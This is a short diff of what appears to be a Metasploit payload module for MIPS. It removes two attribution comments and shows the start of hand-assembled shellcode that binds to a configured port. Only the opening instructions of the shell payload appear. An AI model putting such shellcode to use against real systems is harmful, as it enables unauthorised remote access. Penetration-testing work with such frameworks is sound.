@@ -46,8 +46,6 @@ module Metasploit3
     port = Integer(datastore['LPORT'])
     port = [port].pack("n").unpack("cc");
 
-    # based on vaicebine at gmail dot com shellcode
-    # and scut paper Writing MIPS/Irix shellcode
     shellcode =
     "\xe0\xff\xbd\x27" + #     addiu   sp,sp,-32
     "\xfd\xff\x0e\x24" + #     li      t6,-3
